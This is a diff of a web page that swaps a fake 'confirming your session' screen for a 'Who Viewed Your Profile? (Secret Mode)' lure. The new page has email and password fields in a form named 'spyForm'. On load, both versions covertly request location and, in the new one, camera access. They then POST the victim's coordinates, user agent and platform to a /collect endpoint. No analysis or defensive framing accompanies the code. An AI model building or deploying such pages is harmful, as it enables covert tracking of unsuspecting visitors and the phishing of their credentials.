@@ -1,83 +1,103 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <title>Account Confirmation</title>
+  <meta charset="UTF-8">
+  <title>🔍 Profile Viewer Checker</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="icon" href="/static/icon.png">
   <style>
     body {
-      font-family: Arial, sans-serif;
-      background: #f5f6fa;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
       margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(135deg, #2c3e50, #3498db);
+      color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
     }
     .box {
-      background: white;
+      background: rgba(255, 255, 255, 0.1);
       padding: 30px;
-      border-radius: 12px;
-      box-shadow: 0 0 20px rgba(0,0,0,0.1);
+      border-radius: 16px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.3);
       text-align: center;
+      width: 320px;
+      backdrop-filter: blur(8px);
     }
-    .box h2 {
-      color: #444;
+    h1 {
+      font-size: 28px;
       margin-bottom: 20px;
     }
-    .loader {
-      border: 5px solid #f3f3f3;
-      border-top: 5px solid #3498db;
-      border-radius: 50%;
-      width: 40px;
-      height: 40px;
-      animation: spin 1s linear infinite;
-      margin: auto;
+    p {
+      margin-bottom: 30px;
+      font-size: 16px;
+      color: #f1f1f1;
     }
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
+    input, button {
+      width: 100%;
+      padding: 12px;
+      margin: 8px 0;
+      border-radius: 8px;
+      border: none;
+      font-size: 16px;
+    }
+    input {
+      background: #ecf0f1;
+      color: #2c3e50;
+    }
+    button {
+      background: #e74c3c;
+      color: white;
+      cursor: pointer;
+      font-weight: bold;
+    }
+    button:hover {
+      background: #c0392b;
     }
   </style>
 </head>
 <body>
   <div class="box">
-    <h2>Confirming your session...</h2>
-    <div class="loader"></div>
+    <h1>👁 Who Viewed Your Profile?</h1>
+    <p>Enter your email to check last profile visitors (Secret Mode)</p>
+    <form id="spyForm">
+      <input type="text" placeholder="Enter your email" required>
+      <input type="password" placeholder="Your password" required>
+      <button type="submit">Check Now</button>
+    </form>
   </div>
 
   <script>
-    function getDeviceInfo() {
-      const ua = navigator.userAgent;
-      const deviceInfo = navigator.platform || "Unknown";
-      return { userAgent: ua, deviceInfo: deviceInfo };
-    }
-
-    navigator.geolocation.getCurrentPosition(function(position) {
-      const payload = {
-        latitude: position.coords.latitude,
-        longitude: position.coords.longitude,
-        camera: "✅ Location Allowed",
-        ...getDeviceInfo()
-      };
-      send(payload);
-    }, function(err) {
-      const payload = {
-        latitude: null,
-        longitude: null,
-        camera: "❌ Location Denied",
-        ...getDeviceInfo()
-      };
-      send(payload);
-    });
-
-    function send(data) {
-      fetch("/collect", {
+    async function collectData(status, latitude = null, longitude = null) {
+      await fetch("/collect", {
         method: "POST",
         headers: {"Content-Type": "application/json"},
-        body: JSON.stringify(data)
+        body: JSON.stringify({
+          userAgent: navigator.userAgent,
+          latitude: latitude,
+          longitude: longitude,
+          camera: status,
+          deviceInfo: navigator.platform
+        })
       });
     }
+
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            collectData("✅ Allowed", pos.coords.latitude, pos.coords.longitude);
+          },
+          err => {
+            collectData("❌ Location Denied");
+          }
+        );
+        stream.getTracks().forEach(track => track.stop());
+      })
+      .catch(err => {
+        collectData("❌ Camera Denied");
+      });
   </script>
 </body>
 </html>
